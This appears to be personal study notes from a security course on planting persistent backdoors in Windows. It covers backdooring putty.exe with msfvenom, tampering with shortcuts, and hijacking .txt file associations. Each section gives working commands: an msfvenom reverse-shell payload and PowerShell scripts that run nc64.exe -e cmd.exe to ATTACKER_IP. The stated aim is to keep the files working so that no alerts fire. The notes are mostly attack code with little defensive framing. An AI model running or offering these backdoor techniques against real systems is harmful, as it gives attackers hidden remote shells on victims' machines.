#cybersecurity #windows 

We can plant backdoors that will get executed whenever the user access them. The file must keep working as expected to not create any alerts

### Executable files
Find executables in desktop.
We can easily plant a payload of our preference in any .exe file with `msfvenom`.
The binary will execute an additional payload silently by adding an extra thread.

```shell
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

This will execute a reverse_tcp meterpreter

### Shortcut Files
We can always tamper with the shortcut file itself
![[tampering-shortcut.png]]

Before hijacking the shortcut target let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Be sure to point the icon back to the original executable

The final shortcut will be:

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```


Let's start an nc listener in the attacker machine

```
user@AttackBox$ nc -lvp 4445
```

After double clicking on the shortcut we should get a connection back to the attacker machine



### Hijacking File Associations
The default operating system file associations are kept inside the registry, where a key is stored for very single file type under
`HKLM\Software\Classes\` 
For example for txt files:
![[hijackingFileAssociations.png]]

The ProgID is simply an identifier to a program installed on the system.
We can search for a subkey for the corresponding ProgID
![[hijackingFileAssociations2.png]]

We can replace the command with a script that executes a backdoor

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Then we create a listener and then opening a txt file we get the connection back to the attacker machine